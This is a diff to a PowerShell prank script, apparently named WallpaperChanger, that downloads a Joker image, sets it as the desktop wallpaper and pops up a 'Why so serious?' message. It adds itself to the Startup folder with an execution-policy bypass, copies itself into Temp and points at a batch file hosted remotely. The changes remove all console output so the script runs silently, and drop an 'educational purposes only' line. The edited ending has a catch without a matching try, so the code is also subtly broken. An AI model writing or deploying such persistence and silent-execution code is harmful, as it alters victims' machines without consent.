@@ -1,5 +1,4 @@
 $scriptPath1 = "$env:userprofile\AppData\Local\Temp\set.ps1"
-#$scriptPath2 = "$env:userprofile\Documents\set.ps1"
 $scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\set.ps1"
 $batFilePath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
 $batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"
@@ -8,9 +7,14 @@ $batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperCha
 $startDelayEnabled = $false
 $delayHours = 3
 
+function Show-ErrorMessage {
+    param([string]$errorMessage)
+    Add-Type -AssemblyName PresentationFramework
+    [System.Windows.MessageBox]::Show($errorMessage, "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
+}
+
 function Get-ScriptPath {
     if (Test-Path $scriptPath1) { return $scriptPath1 }
-    #elseif (Test-Path $scriptPath2) { return $scriptPath2 }
     elseif (Test-Path $scriptPath3) { return $scriptPath3 }
     else { return $null }
 }
@@ -23,7 +27,6 @@ if ($null -eq $scriptPath) {
 }
 
 if ($startDelayEnabled -eq $true) {
-    Write-Host "Waiting for $delayHours hour(s)..."
     Start-Sleep -Seconds ($delayHours * 3600)
 }
 
@@ -31,30 +34,19 @@ if ($startDelayEnabled -eq $true) {
 $imagePath = "$env:userprofile\Pictures\background.jpg"
 $imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg"
 
-if (-not (Test-Path $imagePath)) {
-    Write-Host "Downloading image..."
-
-    try {
-        Write-Host "Trying to download with curl..."
-        Invoke-Expression "curl -o `"$imagePath`" `"$imageUrl`""
-        if (Test-Path $imagePath) {
-            Write-Host "Image downloaded successfully with curl."
-        } else {
-            Write-Host "Curl failed. Trying Invoke-WebRequest..."
-            Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
-            if (Test-Path $imagePath) {
-                Write-Host "Image downloaded successfully with Invoke-WebRequest."
-            } else {
-                Write-Host "Failed to download image with both curl and Invoke-WebRequest."
-                exit
+try {
+    if (-not (Test-Path $imagePath)) {
+        Invoke-Expression "curl -o `"$imagePath`" `"$imageUrl`"" | Out-Null
+        if (-not (Test-Path $imagePath)) {
+            Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath | Out-Null
+            if (-not (Test-Path $imagePath)) {
+                throw "Failed to download image."
             }
         }
-    } catch {
-        Write-Host "Error during download: $_"
-        exit
     }
-} else {
-    Write-Host "Image already exists. Setting as wallpaper."
+} catch {
+    Show-ErrorMessage "Error during image download: $_"
+    exit
 }
 
 try {
@@ -67,9 +59,9 @@ try {
     }
 "@
     [Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01)
-    Write-Host "Wallpaper updated successfully."
 } catch {
-    Write-Host "Failed to update wallpaper: $_"
+    Show-ErrorMessage "Failed to update wallpaper: $_"
+    exit
 }
 
 try {
@@ -78,22 +70,24 @@ try {
         [System.Windows.MessageBox]::Show("Why so serious?", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
     }
 } catch {
-    Write-Host "WMI not available in this environment."
 }
 
 $startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Start.lnk"
 
 if (-not (Test-Path $startupShortcutPath)) {
-    $WshShell = New-Object -ComObject WScript.Shell
-    $shortcut = $WshShell.CreateShortcut($startupShortcutPath)
-    $shortcut.TargetPath = "powershell.exe"
-    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
-    $shortcut.Save()
-    Write-Host "Added to startup."
+    try {
+        $WshShell = New-Object -ComObject WScript.Shell
+        $shortcut = $WshShell.CreateShortcut($startupShortcutPath)
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`"" 
+        $shortcut.Save()
+    } catch {
+        Show-ErrorMessage "Failed to add script to startup: $_"
+    }
 }
 
 if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
-    Copy-Item $MyInvocation.MyCommand.Path $scriptPath1
+    Copy-Item $MyInvocation.MyCommand.Path $scriptPath1 -ErrorAction Stop
+} catch {
+    Show-ErrorMessage "Failed to copy script to temp folder: $_"
 }
-
-# Educational purposes only!
